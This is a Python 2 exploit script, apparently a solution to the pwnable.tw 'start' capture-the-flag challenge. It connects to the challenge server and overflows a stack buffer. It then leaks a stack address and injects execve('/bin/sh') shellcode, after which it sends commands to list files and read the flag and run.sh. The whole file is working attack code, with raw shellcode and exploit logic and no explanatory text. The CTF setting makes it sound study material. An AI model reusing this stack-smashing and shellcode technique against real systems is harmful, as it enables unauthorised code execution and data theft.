import array
import socket
import struct
import binascii

def f_recv(s):
    recv=s.recv(2048)
    if not recv:
        print("no data received")
    else:
        print("recv len="+str(len(recv))+", data="+str(recv))
    return recv
    
def f_send(s,data):
    print("send len="+str(len(bytearray(data))))    
    s.send(data)

def check_stack_for_write():
    ret=False
    payload="Payload 1 data repl\0"+struct.pack('<I', 0x08048089)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("chall.pwnable.tw", 10000))
    f_recv(s)
    f_send(s,payload)
    rcv=f_recv(s)
    if str(rcv) == payload[:20]:
        print "stack sucessfully modified !!!\n\n------------------------------------------\n"
        ret=True
    s.close()
    return ret
    
def test_stack_for_execute():
    ret=False
    payload="Payload 2 data repl\0"+struct.pack('<I', 0x0804808b)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("chall.pwnable.tw", 10000))        
    f_recv(s)
    f_send(s,payload)
    rcv=f_recv(s)    
    our_ptr=struct.unpack_from('<I', rcv,20)[0]
    stack_ptr=struct.unpack_from('<I', rcv,24)[0]
    print("stack_ptr="+hex(stack_ptr)+", our_ptr="+hex(our_ptr))
    esp=stack_ptr+4;
    
    #  to check, that stack address is right
    #payload=struct.pack('<I', 0x00000000)*11+struct.pack('<I', 0x08048066)

    #mov eax,0x08048066
    #jmp eax
    shell="\xB8\x66\x80\x04\x08\xFF\xE0\x00"
    shell_dwords=len(shell)/4
    payload=shell+struct.pack('<I', 0x00000000)*(11-shell_dwords)+struct.pack('<I', stack_ptr-(7*4))
    
    #print binascii.hexlify(payload)
    f_send(s,payload)
    rcv=f_recv(s)
    if str(rcv) == "Let's start the CTF:":
        print "it's possible to execute on stack !!!\n\n------------------------------------------\n"
        ret=True
    
    s.close()  
    return ret           
    
def convert_string_to_byte_array(string):
    ba=bytearray(string+'\0')
    ba.reverse()
    while len(ba) % 4 !=0:
        ba.extend('\0')
    return ''.join("\\x{:02x}".format(x) for x in ba)    
        
def format_string_mult_4(string):
    while len(string) % 4 !=0:
        string +="\x00"
    return string
    
def execute_payload():  
    ret=False
    payload="Payload 3 data repl\0"+struct.pack('<I', 0x0804808b)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("chall.pwnable.tw", 10000))        
    f_recv(s)
    f_send(s,payload)
    rcv=f_recv(s)    
    our_ptr=struct.unpack_from('<I', rcv,20)[0]
    stack_ptr=struct.unpack_from('<I', rcv,24)[0]
    print("stack_ptr="+hex(stack_ptr)+", our_ptr="+hex(our_ptr))
    esp=stack_ptr+4;

    # run "/bin/sh"
    #push 0x0068732f
    #push 0x6e69622f
    #mov al,0xb
    #mov ebx,esp
    #xor ecx,ecx
    #xor edx,edx
    #int 0x80
    
    shell=convert_string_to_byte_array("/bin/sh");   
    shell="\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
    shell_dwords=len(shell)/4
    payload=shell+struct.pack('<I', 0x00000000)*(11-shell_dwords)+struct.pack('<I', stack_ptr-(7*4))    

    f_send(s,payload)
    f_send(s,"cd /home/start;ls -l\n")
    rcv=f_recv(s)            
    f_send(s,"cat flag\n")
    rcv=f_recv(s)
    f_send(s,"cat run.sh\n")
    rcv=f_recv(s)          
    s.close()   
   

if check_stack_for_write():
    if test_stack_for_execute():
        execute_payload()



